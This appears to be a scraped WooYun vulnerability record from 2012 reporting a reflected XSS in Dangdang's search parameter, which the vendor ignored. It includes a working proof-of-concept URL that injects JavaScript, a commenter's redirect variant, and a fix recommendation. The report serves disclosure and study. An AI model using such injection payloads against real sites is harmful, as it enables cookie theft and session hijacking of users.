{"id": 21537, "wybug_id": "wooyun-2012-03915", "wybug_title": "当当反射型xss", "wybug_corp": "当当网", "wybug_author": "pentest", "wybug_date": "2012-01-17 20:57", "wybug_open_date": "2012-01-22 20:58", "wybug_type": "xss跨站脚本攻击", "wybug_level": "低", "wybug_rank_0": "5", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["反射型", "里进行"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-01-17：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-01-22：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 当当反射型xss，导致可以获取用户cookies。 详细说明：  用户提交的搜索关键词有一处未经过滤，直接输出到js代码部分中，导致可以注入自定义js代码：提交f',true,1);alert(1);//，即\nhttp://searchb.dangdang.com/?key=f',true,1);alert(1);//\n：\n<script type=\"text/javascript\">            $(document).ready(function(){DD_ADSMART.fetchCPM(11348,\"new\");DD_ADSMART.fetchCPTSlide(11366,11367,11368,11369,4,\"newsearch\",false);DD_ADSMART.fetchCPTSlide(11278,11279,11280,11281,4,\"newsearch\",true);DD_ADSMART.fetchCPTSlide(11391,11392,0,0,4,\"multysearch\");DD_ADSMART.fetchCPC(0, 0, 'testf',true,1);alert(1)//', true, 1);        s('view','testf%27%2Ctrue%2C1%29%3Balert%281%29%2F%2F','','','','','0_30','0_0_0_n','','','');    });        </script>\n   漏洞证明：  http://searchb.dangdang.com/?key=testf',true,1);alert(1);//\n\n   修复方案：  过滤html元字符   版权声明：转载请注明来源 pentest@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2012-01-22 20:58 厂商回复：  漏洞Rank：2  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2012-01-23 14:15 |    \t\t锄禾哥 \t\t\t( 实习白帽子  |\t\t\t        Rank:96 漏洞数:18        | <script>alert('我没帽子')</script>)\t\t \n  http://searchb.dangdang.com/?key=testf',true,1);location.href='http://www.baidu.com';//居然忽略了太过分了，LZ我来顶你，QQ过验证了。    \n     2012-01-23 17:55 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  http://searchb.dangdang.com/?key=testf',true,1);location.href='http://www.baidu.com';//  只能用鄙视的眼光看待，忽略    \n     2012-01-24 18:35 |    \t\ticefish \t\t\t( 普通白帽子  |\t\t\t        Rank:104 漏洞数:8        | 欢迎大家和我用邮件进行交流~)\t\t \n  这个算是比较容易利用xss的了，也不算鸡肋，唉，为啥不重视呢    \n     2012-01-25 02:20 |    \t\t猪头子 \t\t\t( 普通白帽子  |\t\t\t        Rank:189 漏洞数:35        | 自信的看着队友rm -rf/tar挂服务器)\t\t \n  无语，忽略    \n     2012-03-30 17:04 |    \t\tjun \t\t\t( 实习白帽子  |\t\t\t        Rank:50 漏洞数:11        | xxx)\t\t \n  把漏洞做成案例，成功入侵事件！估计就不会忽略了，    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}